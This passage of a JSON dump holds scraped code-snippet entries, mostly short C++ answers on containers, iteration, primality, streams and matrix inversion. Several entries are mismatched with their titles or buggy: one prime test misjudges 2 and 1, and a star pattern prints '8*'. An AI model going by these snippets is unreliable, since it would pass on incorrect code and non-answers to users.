  },
  {
    "id": 2846,
    "keyword": null,
    "link": null,
    "title": " interfaces in c++",
    "description": "#include <iostream> #include  <string> //Pure virtual function or inteface allows us to define a function in a base class that doesn't have an implementation or definition in the base class and force sub classes to implement that function //Pure virtual function is also called an interface in other languages class Entity { public: \t//virtual std::string GetName() { return \"Entity\"; }//This is a function that is just virtual .Overriding this function in sub class is optional we can instantiate subcllass without overriding  or implementing this function \t \t//Below is an example a Pure Virtual Function \t//It is an unimplemented function ant it forces the  sub class to implement it and define it \t//You will not be able to instantiate sub class without implementing or defining the function in sub class \tvirtual std::string GetName() = 0;    //the pure virtual function must have virtual written at the beginning and =0 at the end  //This function cannot contain any definition in base class,it is just a declaration }; class Player :public Entity { \tstd::string m_name;  public: \tPlayer(const std::string& name) \t\t:m_name(name) \t{}; \tvoid Print() { std::cout << \"This is Sub class\" << std::endl; }; \tstd::string GetName()override { return m_name; };//Pure virtual functions is implemented here in this sub class };  int main() { \t//Entity a;//We can't do this because class Entity contains function that is unimplemented \tPlayer x(\"Jacob\");//This will work because we have implemented or defined the function in this sub class \tstd::cin.get(); }\n",
    "reg_date": "2021-10-12T11:41:39.000Z"
  },
  {
    "id": 2847,
    "keyword": null,
    "link": null,
    "title": " interpreter latex matlab",
    "description": "set(groot,'defaultAxesTickLabelInterpreter','latex');  set(groot,'defaulttextinterpreter','latex'); set(groot,'defaultLegendInterpreter','latex');\n",
    "reg_date": "2021-10-12T11:41:39.000Z"
  },
  {
    "id": 2848,
    "keyword": null,
    "link": null,
    "title": " intersection.cpp",
    "description": "#include\"iostream\"  using namespace std;   int A[] = {2, 4, 3, 5, 6, 7}; int B[] = {9, 2, 7, 6};  int main() {     int sizeA = sizeof(A)/sizeof(int);      int sizeB = sizeof(B)/sizeof(int);      int big =  (sizeA > sizeB) ? sizeA : sizeB;      int small =  (sizeA > sizeB) ? sizeB : sizeA;      for (int i = 0; i <big ;++i)     {         for (int j = 0; j <small ; ++j)         {             if(A[i] == B[j])             {                 cout<<\"Element is -->\"<<A[i]<<endl;             }         }     }      return 0; } \n",
    "reg_date": "2021-10-12T11:41:39.000Z"
  },
  {
    "id": 2849,
    "keyword": null,
    "link": null,
    "title": " intersection between vector c++",
    "description": "#include <algorithm> //std::sort #include <iostream> //std::cout #include <string> //std::string #include <vector> //std::vector  std::vector<std::string> intersection(std::vector<std::string> &v1,                                       std::vector<std::string> &v2){     std::vector<std::string> v3;      std::sort(v1.begin(), v1.end());     std::sort(v2.begin(), v2.end());      std::set_intersection(v1.begin(),v1.end(),                           v2.begin(),v2.end(),                           back_inserter(v3));     return v3; }  int main(){     std::vector<std::string> v1 {\"a\",\"b\",\"c\"};     std::vector<std::string> v2 {\"b\",\"c\"};      auto v3 = intersection(v1, v2);      for(std::string n : v3)         std::cout << n << ' '; }\n",
    "reg_date": "2021-10-12T11:41:39.000Z"
  },
  {
    "id": 2850,
    "keyword": null,
    "link": null,
    "title": " interview experience as a call?",
    "description": "interview experience as a call?\nasp.net codes\n",
    "reg_date": "2021-10-12T11:41:39.000Z"
  },
  {
    "id": 2851,
    "keyword": null,
    "link": null,
    "title": " intiating a vector",
    "description": "int size = 3;  // all values as 10. vector<int> vect(size, 10);\n",
    "reg_date": "2021-10-12T11:41:40.000Z"
  },
  {
    "id": 2852,
    "keyword": null,
    "link": null,
    "title": " intlen in c++",
    "description": "// getting the legth of an int by turning it into a string // works with double and float too  #include <iostream>  int num = 0;  // turning num into a string using std::string std::string temp = std::to_string(num);  // getting the length using .length() int len = temp.length(); \n",
    "reg_date": "2021-10-12T11:41:40.000Z"
  },
  {
    "id": 2853,
    "keyword": null,
    "link": null,
    "title": " invalid types int int for array subscript c++",
    "description": "template<int numberOfRows, int numberOfColumns> void printArray(int (&theArray)[numberOfRows][numberOfColumns]) {     for(int x = 0; x < numberOfRows; x++){         for(int y = 0; y < numberOfColumns; y++){             cout << theArray[x][y] << \" \";         }         cout << endl;     } }\n",
    "reg_date": "2021-10-12T11:41:40.000Z"
  },
  {
    "id": 2854,
    "keyword": null,
    "link": null,
    "title": " inverse of a matrix 3x3 c++",
    "description": "#include<bits/stdc++.h> #include <iostream> #include <cmath> #include <iomanip> #define N 3 using namespace std;  void getCoFactor(int a[N][N],int b[N][N],int p,int q,int k){     int i,j,m,n;      m=0; // Intinializing the row for co-factor matrix;     n=0; // Intinializing the column for co-factor matrix;     for(i = 0;i < k;i++){         for(j=0;j<k;j++){                 b[i][j] = 0;                 if(i!=p && j!=q){                     b[m][n] = a[i][j];                      if(n < k-2)   // Increasing row index when                         n++;                     else{                         n = 0;   //increasing row index and resetting column index                         m++;                     }                 }         }     }     }  int determinant(int a[N][N], int k){     int det;     if(k==1)         return a[0][0]; // Matrix order is 1      else{         int c,s=1,b[N][N],i,j,m,n;         det = 0;         for(c = 0;c < k;c++){              getCoFactor(a,b,0,c,k);              det = det + s*(a[0][c]* determinant(b,k-1));             s = -1*s;          }      }      return det;  }    void adjoint(int a[N][N], int adj[N][N], int k){      int s = 1;     int co_fact[N][N];      for(int i=0; i<k ; i++){         for(int j=0;j<k;j++){                  getCoFactor(a,co_fact,i,j,k);                  s = pow(-1,(i+j));                 adj[j][i] = s*determinant(co_fact,k-1);          }     }      }   void Inverse(int A[N][N], float inverse[N][N],int k){        int deter = determinant(A,N);      int adj[N][N];     adjoint(A,adj,k); //Finding the adjoint of the matrix        for(int i=0; i<k ; i++){         for(int j=0;j<k;j++){                 inverse[i][j] = adj[i][j]/(float)deter;         }       }  }        int main() {  //    cout << \"Enter the order of matrix:\"; //    cin >> N;     int A[N][N];      for(int i=0;i<N;i++){         for(int j=0;j<N;j++){         cout << \"Enter matrix at a[\" << i << \"]\" << \"[\" <<j << \"]\" << \": \" ;         cin >> A[i][j];         }     }       int deter = determinant(A,N);       if(deter == 0){         cout << \"Inverse does not exist.\" << endl;         return false;         }       float inverse[N][N];        Inverse(A,inverse,N);        for(int i=0;i<N;i++){         for(int j=0;j<N;j++){         cout <<  inverse[i][j] << \" \";         }         cout <<  endl;     }              return 0; }  //Sources //https://www.geeksforgeeks.org/adjoint-inverse-matrix/ //https://scanftree.com/programs/c/c-program-to-find-the-inverse-of-the-matrix/ //https://www.youtube.com/watch?v=qLDDwT-kPAk&t=801s  \n",
    "reg_date": "2021-10-12T11:41:40.000Z"
  },
  {
    "id": 2855,
    "keyword": null,
    "link": null,
    "title": " inverser les éléments d'un tableau manuellement en c++",
    "description": "#include <iostream>  using namespace std;  int main()  {   \tint array1[5]={1,2,3,4,5}; \tint array2[5];  \tfor(int i=0;i<5;i++)  { \t\tarray2[i]=array1[(5-i)-1];         cout<<\"Number at index\"<<i<<\"=\"<<array2[i]<<endl;  \t} }\n",
    "reg_date": "2021-10-12T11:41:40.000Z"
  },
  {
    "id": 2856,
    "keyword": null,
    "link": null,
    "title": " inverted half pyramid in c++",
    "description": "#include <iostream> using namespace std; int main() {     int num;          cout<< \"Enter length of star pattern: \";     cin >> num;      for (int i=num; i>=1; i--)     {         for (int j = 0; j < i; j++)         {             cout<< \"*\";         }         cout << endl;     }      return 0; }\n",
    "reg_date": "2021-10-12T11:41:40.000Z"
  },
  {
    "id": 2857,
    "keyword": null,
    "link": null,
    "title": " inverted triangle   c++",
    "description": "#include<bits/stdc++.h> using namespace std; int main() { \tint n; \tcin>>n; \tfor(int i=1;i<=n;i++) \t{ \t\tfor(int j=1;j<=n+1-i;j++) \t\t{ \t\t\tcout<<j<<\" \"; \t\t}cout<<endl; \t\t\t \t} \treturn 0; \t }\n#include<bits/stdc++.h> using namespace std; int main() { \tint n; \tcin>>n;\t \tfor(int i=n;i>=1;i--) \t{ \t\tfor(int j=1;j<=i;j++){ \t\t\tcout<<\"8*\";\t\t \t\t} \t\tcout<<endl; \t} \treturn 0; }\n***** **** *** ** *\n",
    "reg_date": "2021-10-12T11:41:40.000Z"
  },
  {
    "id": 2858,
    "keyword": null,
    "link": null,
    "title": " inverted triangle number  pattern in c++",
    "description": "#include<bits/stdc++.h> using namespace std; int main() { \tint n; \tcin>>n; \tfor(int i=1;i<=n;i++) \t{ \t\tfor(int j=1;j<=n+1-i;j++) \t\t{ \t\t\tcout<<j<<\" \"; \t\t}cout<<endl; \t\t\t \t} \treturn 0; \t }\n#include<bits/stdc++.h> using namespace std; int main() { \tint n; \tcin>>n;\t \tfor(int i=n;i>=1;i--) \t{ \t\tfor(int j=1;j<=i;j++){ \t\t\tcout<<\"8*\";\t\t \t\t} \t\tcout<<endl; \t} \treturn 0; }\n",
    "reg_date": "2021-10-12T11:41:41.000Z"
  },
  {
    "id": 2859,
    "keyword": null,
    "link": null,
    "title": " inverted triangle pattern in c++",
    "description": "#include<bits/stdc++.h> using namespace std; int main() { \tint n; \tcin>>n;\t \tfor(int i=n;i>=1;i--) \t{ \t\tfor(int j=1;j<=i;j++){ \t\t\tcout<<\"8*\";\t\t \t\t} \t\tcout<<endl; \t} \treturn 0; }\n",
    "reg_date": "2021-10-12T11:41:41.000Z"
  },
  {
    "id": 2860,
    "keyword": null,
    "link": null,
    "title": " iomanip",
    "description": "// setfill example #include <iostream>     // std::cout, std::endl #include <iomanip>      // std::setfill, std::setw using namespace std;  int main () {   cout << setfill ('x') << setw (10);   cout << 77 << endl;   return 0; }\n// setfill example #include <iostream>     // std::cout, std::endl #include <iomanip>      // std::setfill, std::setw  int main () {   std::cout << std::setfill ('x') << std::setw (10);   std::cout << 77 << std::endl;   return 0; }\n",
    "reg_date": "2021-10-12T11:41:41.000Z"
  },
  {
    "id": 2861,
    "keyword": null,
    "link": null,
    "title": " iostream c++",
    "description": "// iostream_cerr.cpp // compile with: /EHsc #include <iostream> #include <fstream>  using namespace std;  void TestWide( ) {    int i = 0;    wcout << L\"Enter a number: \";    wcin >> i;    wcerr << L\"test for wcerr\" << endl;    wclog << L\"test for wclog\" << endl; }  int main( ) {    int i = 0;    cout << \"Enter a number: \";    cin >> i;    cerr << \"test for cerr\" << endl;    clog << \"test for clog\" << endl;    TestWide( ); } \nstd::cout << \"Hello World!\" << std::endl; //Or you can do std::cout << \"Hello World!\" <<; //Only in some scenarios \n#include <iostream>\n#include <iostream> std::cin std::cout\nsstream  str()\n",
    "reg_date": "2021-10-12T11:41:41.000Z"
  },
  {
    "id": 2862,
    "keyword": null,
    "link": null,
    "title": " iostream library in cpp",
    "description": "// iostream_cerr.cpp // compile with: /EHsc #include <iostream> #include <fstream>  using namespace std;  void TestWide( ) {    int i = 0;    wcout << L\"Enter a number: \";    wcin >> i;    wcerr << L\"test for wcerr\" << endl;    wclog << L\"test for wclog\" << endl; }  int main( ) {    int i = 0;    cout << \"Enter a number: \";    cin >> i;    cerr << \"test for cerr\" << endl;    clog << \"test for clog\" << endl;    TestWide( ); } \n",
    "reg_date": "2021-10-12T11:41:41.000Z"
  },
  {
    "id": 2863,
    "keyword": null,
    "link": null,
    "title": " iota c++",
    "description": "Elements are : 100 101 102 103 104 105 106 107 108 109 \n",
    "reg_date": "2021-10-12T11:41:41.000Z"
  },
  {
    "id": 2864,
    "keyword": null,
    "link": null,
    "title": " is C++ useful in 2021",
    "description": "Yes Currently C++ is the 4th popular language\n",
    "reg_date": "2021-10-12T11:41:41.000Z"
  },
  {
    "id": 2865,
    "keyword": null,
    "link": null,
    "title": " is TLE means my code is correct but taking more time to computr",
    "description": "TLE actually means that your program excedes the time limit for a  particular test file. So, as soon as the time limit is exceeded the program stops executing and you don&rsquo;t know whether your program  gives AC or not. So, best practice is to optimize your program as much as possible. Even, then it gives TLE, then go for different approach.\n",
    "reg_date": "2021-10-12T11:41:41.000Z"
  },
  {
    "id": 2866,
    "keyword": null,
    "link": null,
    "title": " is it len function is aviable for c+=",
    "description": "str.length();\n#include<iostream> #include<cstring> using namespace std; main() {    string myStr = \"This is a sample string\";    char myStrChar[] = \"This is a sample string\";    cout << \"String length using string::length() function: \" << myStr.length() <<endl;    cout << \"String length using string::size() function: \" << myStr.size() <<endl;    cout << \"String length using strlen() function for c like string: \" << strlen(myStrChar) <<endl;    cout << \"String length using while loop: \";    char *ch = myStrChar;    int count = 0;    while(*ch != '\\0'){       count++;       ch++;    }    cout << count << endl;    cout << \"String length using for loop: \";    count = 0;    for(int i = 0; myStrChar[i] != '\\0'; i++){       count++;    }    cout << count; }\n",
    "reg_date": "2021-10-12T11:41:41.000Z"
  },
  {
    "id": 2867,
    "keyword": null,
    "link": null,
    "title": " is javascript for websites only",
    "description": "// no it can be used for programs as well. \n",
    "reg_date": "2021-10-12T11:41:42.000Z"
  },
  {
    "id": 2868,
    "keyword": null,
    "link": null,
    "title": " is not a nonstatic data member or base class of class",
    "description": "struct A {     float m_x;     float m_z;     A(){} protected:     A(float x): m_x(x) {} };  class B : public A { public:     B(float z) : A(z) {}     // alternatively     // B(float z) {     //     m_x = z;     // } };  int main(){     B b(1);     return 0; }\n",
    "reg_date": "2021-10-12T11:41:42.000Z"
  },
  {
    "id": 2869,
    "keyword": null,
    "link": null,
    "title": " is obje file binary??",
    "description": "Object files. These files are produced as the output of the compiler. They consist of function definitions in binary form, but they are not executable by themselves.\n",
    "reg_date": "2021-10-12T11:41:42.000Z"
  },
  {
    "id": 2870,
    "keyword": null,
    "link": null,
    "title": " is power of 2",
    "description": "bool isPowerOfTwo(int n) {                return n > 0 && !(n&(n-1));     }\n",
    "reg_date": "2021-10-12T11:41:42.000Z"
  },
  {
    "id": 2871,
    "keyword": null,
    "link": null,
    "title": " is the c++ 20 char te same as the old one",
    "description": "std::cout << std::is_same_v<unsigned char, char8_t>;\nreinterpret_cast<const char   *>(u8\"text\"); // Ok. reinterpret_cast<const char8_t*>(\"text\");   // Undefined behavior.\n",
    "reg_date": "2021-10-12T11:41:42.000Z"
  },
  {
    "id": 2872,
    "keyword": null,
    "link": null,
    "title": " is variable sized array are not allowed in c++?",
    "description": "it is allowed in c but not in c++  \n",
    "reg_date": "2021-10-12T11:41:42.000Z"
  },
  {
    "id": 2873,
    "keyword": null,
    "link": null,
    "title": " is vowel c++",
    "description": "// c is a char auto isLowercaseVowel = (c == 'a' || c == 'e' || c == 'i' || c == 'o' || c == 'u'); auto isUppercaseVowel = (c == 'A' || c == 'E' || c == 'I' || c == 'O' || c == 'U');\n",
    "reg_date": "2021-10-12T11:41:42.000Z"
  },
  {
    "id": 2874,
    "keyword": null,
    "link": null,
    "title": " is x prime?",
    "description": "#include<bits/stdc++.h> using namespace std; bool Is_Prime(long long x){ \tif(x%2==0)return false; \tfor(int i=3;i*i<=x;i+=2) \t\tif(x%i==0)return false; \treturn true; } int main(){ \tlong long x; \tcin>>x; \tif(Is_Prime(x))cout<<\"Is Prime\"; \telse cout<<\"Is not Prime\"; }\n",
    "reg_date": "2021-10-12T11:41:42.000Z"
  },
  {
    "id": 2875,
    "keyword": null,
    "link": null,
    "title": " isalpha c++",
    "description": "#include<stdio.h> #include<ctype.h>  int main() {    char val1 = 's';    char val2 = '8';     if(isalpha(val1))    printf(\"The character is an alphabet\\n\");    else    printf(\"The character is not an alphabet\\n\");     if(isalpha(val2))    printf(\"The character is an alphabet\\n\");    else    printf(\"The character is not an alphabet\");     return 0; }\nchar test='a'; cout<<isalpha(test);\n",
    "reg_date": "2021-10-12T11:41:42.000Z"
  },
  {
    "id": 2876,
    "keyword": null,
    "link": null,
    "title": " isdigit c++",
    "description": "int isdigit ( int c ); Checks whether c is a decimal digit character.    A value different from zero (i.e., true) if indeed c is a decimal digit. Zero (i.e., false) otherwise.   /* isdigit example */ #include <stdio.h> #include <stdlib.h> #include <ctype.h> int main () {   char str[]=\"1776ad\";   int year;   if (isdigit(str[0]))   {     year = atoi (str);     printf (\"The year that followed %d was %d.\\n\",year,year+1);   }   return 0; }    /* Output */ The year that followed 1776 was 1777\nstr = \"10\"    //Evaluates to True isdigit(str[0])\n#include<stdio.h> #include<ctype.h>  int main() {    char val1 = 's';    char val2 = '8';     if(isdigit(val1))    printf(\"The character is a digit\\n\");    else    printf(\"The character is not a digit\\n\");     if(isdigit(val2))    printf(\"The character is a digit\\n\");    else    printf(\"The character is not a digit\");     return 0; }\n",
    "reg_date": "2021-10-12T11:41:43.000Z"
  },
  {
    "id": 2877,
    "keyword": null,
    "link": null,
    "title": " isprime c++",
    "description": "#include <iostream> using namespace std;  int main() {   int n, i;   bool isPrime = true;    cout << \"Enter a positive integer: \";   cin >> n;    for(i = 2; i <= n / 2; ++i)   {       if(n % i == 0)       {           isPrime = false;           break;       }   }   if (isPrime)       cout << \"This is a prime number\";   else       cout << \"This is not a prime number\";    return 0; }\nbool isprime(int n) {     if(n<=1)         return false;     for (int i = 2; i <= sqrt(n); i++)         if (n % i == 0)             return false;        return true; }\n#include<bits/stdc++.h> using namespace std; bool Is_Prime(long long x){ \tif(x%2==0)return false; \tfor(int i=3;i*i<=x;i+=2) \t\tif(x%i==0)return false; \treturn true; } int main(){ \tlong long x; \tcin>>x; \tif(Is_Prime(x))cout<<\"Is Prime\"; \telse cout<<\"Is not Prime\"; }\n",
    "reg_date": "2021-10-12T11:41:43.000Z"
  },
  {
    "id": 2878,
    "keyword": null,
    "link": null,
    "title": " istream c++",
    "description": "//These functions can access the private data of the class that declared them to be friends! \t std::istream& operator>>(std::istream& ist, Book& b){ \t\t ist >> b.price >> b.title >> b.author; \t\t return ist; \t } \t std::ostream& operator<<(std::ostream& ostr, const Book& b){ \t\t ostr << \"Title: \" << b.title << \"   Autor: \" << b.author << \"   Price: \"<< b.price ;  \t\t return ostr; \t }\n",
    "reg_date": "2021-10-12T11:41:43.000Z"
  },
  {
    "id": 2879,
    "keyword": null,
    "link": null,
    "title": " istream operator",
    "description": "istream& operator>> (istream& is, Date& dt) {     is>> dt.mo>> dt.da>> dt.yr;     return is; } \n",
    "reg_date": "2021-10-12T11:41:43.000Z"
  },
  {
    "id": 2880,
    "keyword": null,
    "link": null,
    "title": " istringstream",
    "description": "// istringstream::str #include <string>       // std::string #include <iostream>     // std::cout #include <sstream>      // std::istringstream  int main () {   std::istringstream iss;   std::string strvalues = \"32 240 2 1450\";    iss.str (strvalues);    for (int n=0; n<4; n++)   {     int val;     iss >> val;     std::cout << val << '\\n';   }   std::cout << \"Finished writing the numbers in: \";   std::cout << iss.str() << '\\n';   return 0; }\nIf you include #include <sstream> then you must also reference the class by:  std::stringstream or declare using namespace std; before using it.\n",
    "reg_date": "2021-10-12T11:41:43.000Z"
  },
  {
    "id": 2881,
    "keyword": null,
    "link": null,
    "title": " istringstream delimiter",
    "description": "// istringstream constructors. #include <iostream>     // std::cout #include <sstream>      // std::istringstream #include <string>       // std::string  int main () {    std::string stringvalues = \"125 320 512 750 333\";   std::istringstream iss (stringvalues);    for (int n=0; n<5; n++)   {     int val;     iss >> val;     std::cout << val*2 << '\\n';   }    return 0; }\n",
    "reg_date": "2021-10-12T11:41:43.000Z"
  },
  {
    "id": 2882,
    "keyword": null,
    "link": null,
    "title": " iterate const vector",
    "description": "void func(const std::vector<type>& vec) {   std::vector<type>::const_iterator iter;   for (iter = vec.begin(); iter != vec.end(); ++iter)     // do something with *iter }\n",
    "reg_date": "2021-10-12T11:41:43.000Z"
  },
  {
    "id": 2883,
    "keyword": null,
    "link": null,
    "title": " iterate on vector c++",
    "description": "vector<int> myVector;  myVector.push_back(1); myVector.push_back(2); myVector.push_back(3); myVector.push_back(4);  for(auto x: myVector){ \tcout<< x << \" \";  }  vector<pair<int,int>> myVectorOfPairs;  myVectorOfPairs.push_back({1,2}); myVectorOfPairs.push_back({3,4}); myVectorOfPairs.push_back({5,6}); myVectorOfPairs.push_back({7,8});  for(auto x: myVectorOfPairs){ \tcout<< x.first << \" \" << x.second << endl;  }       \nfor(auto const& value: a) {      /* std::cout << value; ... */ }\n#include <iostream> #include <vector> using namespace std;  vector<int> myvector;  for (vector<int>::iterator it = myvector.begin();      it != myvector.end();      ++it)    cout << ' ' << *it; cout << '\\n'; \nfor (auto & element : vector) {     element.doSomething (); }\n// EXAMPLE vector<string> vData; vData.push_back(\"zeroth\"); vData.push_back(\"first\"); vData.push_back(\"second\"); vData.push_back(\"third\");  std::vector<string>::iterator itData;  for (itData = vData.begin(); itData != vData.end() ; itData++) {   auto ElementIndex = itData-vData.begin();   auto ElementValue = vData[ElementIndex]; // vData[ElementIndex] = *itData   cout << \"[ElementIndex:\" << ElementIndex << \"][ElementValue:\" << ElementValue << \"]\\n\"; }  /* HEADER(S) #include <vector> #include <iostream> using namespace std; */\n// vector::begin/end #include <iostream> #include <vector>  int main () {   std::vector<int> myvector;   for (int i=1; i<=5; i++) myvector.push_back(i);    std::cout << \"myvector contains:\";   for (std::vector<int>::iterator it = myvector.begin() ; it != myvector.end(); ++it)     std::cout << ' ' << *it;   std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:41:44.000Z"
  },
  {
    "id": 2884,
    "keyword": null,
    "link": null,
    "title": " iterate over 2 vectors c++",
    "description": "for (auto& [a, b] : zip(containerA, containerB)) {     a = b; }\n",
    "reg_date": "2021-10-12T11:41:44.000Z"
  },
  {
    "id": 2885,
    "keyword": null,
    "link": null,
    "title": " iterate over a range in c++",
    "description": "for (int i=0; i<5; ++i) {   cout << i << \" \"; } // output is 0 1 2 3 4; note 5 is excluded since < is used and not <=\n",
    "reg_date": "2021-10-12T11:41:44.000Z"
  },
  {
    "id": 2886,
    "keyword": null,
    "link": null,
    "title": " iterate over a set in C++",
    "description": "//Given set s for(auto it: s){ \tcout << it << endl; }\n// set::begin/end #include <iostream> #include <set>  int main () {   int myints[] = {75,23,65,42,13};   std::set<int> myset (myints,myints+5);    std::cout << \"myset contains:\";   for (std::set<int>::iterator it=myset.begin(); it!=myset.end(); ++it)     std::cout << ' ' << *it;    std::cout << '\\n';    return 0; }\n//Method 1  // Iterate over all elements of set  // using range based for loop  for (auto& i : mySet)  {     cout << i << \" , \";  }  //Method 2  // Iterate over all elements using for_each  // and lambda function  for_each(mySet.begin(), mySet.end(), [](const auto & str)  {     cout<<str<<\", \";  });  //Method 3  set<string>::iterator it = mySet.begin();  // Iterate till the end of set  while (it != mySet.end())  {     // Print the element     cout << *it << \", \";     //Increment the iterator     it++;  }\n//Method 1  for (auto& i : mySet)  {     cout << i << \" \";  }  //Method 2  for_each(mySet.begin(), mySet.end(), [](const auto & str)  {     cout<<str<<\" \";  });  //Method 3  set<string>::iterator it = mySet.begin();  while (it != mySet.end()) {     cout << *it << \" \";     it++;  } //Method 4  for (set<int>::iterator it=myset.begin(); it!=myset.end(); ++it)     cout <<*it << \" \";\n",
    "reg_date": "2021-10-12T11:41:44.000Z"
  },
  {
    "id": 2887,
    "keyword": null,
    "link": null,
    "title": " iterate over vector in c++",
    "description": "vector<int> myVector;  myVector.push_back(1); myVector.push_back(2); myVector.push_back(3); myVector.push_back(4);  for(auto x: myVector){ \tcout<< x << \" \";  }  vector<pair<int,int>> myVectorOfPairs;  myVectorOfPairs.push_back({1,2}); myVectorOfPairs.push_back({3,4}); myVectorOfPairs.push_back({5,6}); myVectorOfPairs.push_back({7,8});  for(auto x: myVectorOfPairs){ \tcout<< x.first << \" \" << x.second << endl;  }       \nfor(auto const& value: a) {      /* std::cout << value; ... */ }\nfor (auto & element : vector) {     element.doSomething (); }\n",
    "reg_date": "2021-10-12T11:41:44.000Z"
  },
  {
    "id": 2888,
    "keyword": null,
    "link": null,
    "title": " iterate through map c++",
    "description": "//traditional way (long) for(map<string,int>::iterator it=m.begin(); it!=m.end(); ++it) \tif(it->second)cout<<it->first<<\" \"; //easy way(short) just works with c++11 or later versions for(auto &x:m) \tif(x.second)cout<<x.first<<\" \"; //condition is just an example of use \nmap<string, int>::iterator it;  for (it = symbolTable.begin(); it != symbolTable.end(); it++) {     std::cout << it->first    // string (key)               << ':'               << it->second   // string's value                << std::endl; } \n#include <iostream> #include <map>   int main() {   std::map<int, float> num_map;   // calls a_map.begin() and a_map.end()   for (auto it = num_map.begin(); it != num_map.end(); ++it) {     std::cout << it->first << \", \" << it->second << '\\n';   } }\n//Since c++17 for (auto& [key, value]: myMap) {     cout << key << \" has value \" << value << endl; } //Since c++11 for (auto& kv : myMap) {     cout << kv.first << \" has value \" << kv.second << endl; }\n#include <iostream> #include <map>  int main() {     std::map<std::string, int> myMap;      myMap[\"one\"] = 1;     myMap[\"two\"] = 2;     myMap[\"three\"] = 3;      for ( const auto &myPair : myMap ) {         std::cout << myPair.first << \"\\n\";     } } \n    for (auto i : m)         cout << i.first << \"   \" << i.second              << endl;\n",
    "reg_date": "2021-10-12T11:41:44.000Z"
  },
  {
    "id": 2889,
    "keyword": null,
    "link": null,
    "title": " iterate vector from end to begin",
    "description": "for ( vector<int>::reverse_iterator i = my_vector.rbegin();          i != my_vector.rend(); ++i ) {  }  OR  vector<my_class>::iterator i = my_vector.end(); while (i != my_vector.begin()) {      --i;     /*do stuff */  } \n",
    "reg_date": "2021-10-12T11:41:45.000Z"
  },
  {
    "id": 2890,
    "keyword": null,
    "link": null,
    "title": " iterating a set c++",
    "description": "//Given set s for(auto it: s){ \tcout << it << endl; }\n",
    "reg_date": "2021-10-12T11:41:45.000Z"
  },
  {
    "id": 2891,
    "keyword": null,
    "link": null,
    "title": " iterating string in cpp",
    "description": "std::string s(\"Hello world\");  for (char & c : s) {     std::cout << \"One character: \" << c << \"\\n\";     c = '*'; } \n",
    "reg_date": "2021-10-12T11:41:45.000Z"
  },
  {
    "id": 2892,
    "keyword": null,
    "link": null,
    "title": " iteration in c++",
    "description": " while, do, for, and range\n",
    "reg_date": "2021-10-12T11:41:45.000Z"
  },
  {
    "id": 2893,
    "keyword": null,
    "link": null,
    "title": " iterative greatest common divisor GCD",
    "description": "#include <iostream>  using namespace std;  long long gcd(long long m, long long n) {   while ( m != 0)  {     long long old_m = m;     m = n % m;     n = old_m;   }   return abs(n); }   int main() {     cout << gcd(2672, 5678) << endl;   }\n",
    "reg_date": "2021-10-12T11:41:45.000Z"
  },
  {
    "id": 2894,
    "keyword": null,
    "link": null,
    "title": " iterative highest common factor hcf",
    "description": "#include <iostream>  using namespace std;   int hcf(int a, int b) {     while (a != b) {         if (a > b)                 a = a - b;             else                b = b - a;         }     return a; }   int main() {     int a = 24, b = 36;     cout << hcf(a, b) << endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:41:45.000Z"
  },
  {
    "id": 2895,
    "keyword": null,
    "link": null,
    "title": " iterator on std::tuple",
    "description": "#include <tuple> #include <iostream>  int main() {     std::tuple t{42, 'a', 4.2}; // Another C++17 feature: class template argument deduction     std::apply([](auto&&... args) {((std::cout << args << '\\n'), ...);}, t); } \n{     auto tup = std::make_tuple(0, 'a', 3.14);     template for (auto elem : tup)         std::cout << elem << std::endl; } \n#include <tuple> #include <iostream> #include <boost/hana.hpp> #include <boost/hana/ext/std/tuple.hpp>  struct Foo1 {     int foo() const { return 42; } };  struct Foo2 {     int bar = 0;     int foo() { bar = 24; return bar; } };  int main() {     using namespace std;     using boost::hana::for_each;      Foo1 foo1;     Foo2 foo2;      for_each(tie(foo1, foo2), [](auto &foo) {         cout << foo.foo() << endl;     });      cout << \"foo2.bar after mutation: \" << foo2.bar << endl; } \ntemplate <size_t ...I> struct index_sequence {};  template <size_t N, size_t ...I> struct make_index_sequence : public make_index_sequence<N - 1, N - 1, I...> {};  template <size_t ...I> struct make_index_sequence<0, I...> : public index_sequence<I...> {}; \n#include <tuple> #include <utility>  template<std::size_t N> struct tuple_functor {     template<typename T, typename F>     static void run(std::size_t i, T&& t, F&& f)     {         const std::size_t I = (N - 1);         switch(i)         {         case I:             std::forward<F>(f)(std::get<I>(std::forward<T>(t)));             break;          default:             tuple_functor<I>::run(i, std::forward<T>(t), std::forward<F>(f));         }     } };  template<> struct tuple_functor<0> {     template<typename T, typename F>     static void run(std::size_t, T, F){} }; \nstd::apply([](auto ...x){std::make_tuple(x.do_something()...);} , the_tuple); \n// prints every element of a tuple template<size_t I = 0, typename... Tp> void print(std::tuple<Tp...>& t) {     std::cout << std::get<I>(t) << \" \";     // do things     if constexpr(I+1 != sizeof...(Tp))         print<I+1>(t); } \n",
    "reg_date": "2021-10-12T11:41:45.000Z"
  },
  {
    "id": 2896,
    "keyword": null,
    "link": null,
    "title": " javidx9 age",
    "description": "// hopefully, javidx9 will be big soon\n",
    "reg_date": "2021-10-12T11:41:45.000Z"
  },
  {
    "id": 2897,
    "keyword": null,
    "link": null,
    "title": " jelaskan asal usul bangsa arab",
    "description": "#include <iostream>\n",
    "reg_date": "2021-10-12T11:41:45.000Z"
  },
  {
    "id": 2898,
    "keyword": null,
    "link": null,
    "title": " job sequencing with deadlines in daa",
    "description": "Algorithm: Job-Sequencing-With-Deadline (D, J, n, k)  D(0) := J(0) := 0  k := 1  J(1) := 1   // means first job is selected  for i = 2 &hellip; n do     r := k     while D(J(r)) > D(i) and D(J(r)) &ne; r do        r := r &ndash; 1     if D(J(r)) &le; D(i) and D(i) > r then        for l = k &hellip; r + 1 by -1 do           J(l + 1) := J(l)           J(r + 1) := i           k := k + 1  \n",
    "reg_date": "2021-10-12T11:41:46.000Z"
  },
  {
    "id": 2899,
    "keyword": null,
    "link": null,
    "title": " joining two vectors in c++",
    "description": "// my linkedin : https://www.linkedin.com/in/vaalarivan-prasanna-3a07bb203/ vector<int> AB; AB.reserve(A.size() + B.size()); // preallocate memory AB.insert(AB.end(), A.begin(), A.end()); AB.insert(AB.end(), B.begin(), B.end()); //eg : A = {4, 1}, B = {2, 5} //after the 2 insert operations, AB = {4, 1, 2, 5}\n",
    "reg_date": "2021-10-12T11:41:46.000Z"
  },
  {
    "id": 2900,
    "keyword": null,
    "link": null,
    "title": " jquery ajax post json asp.net core",
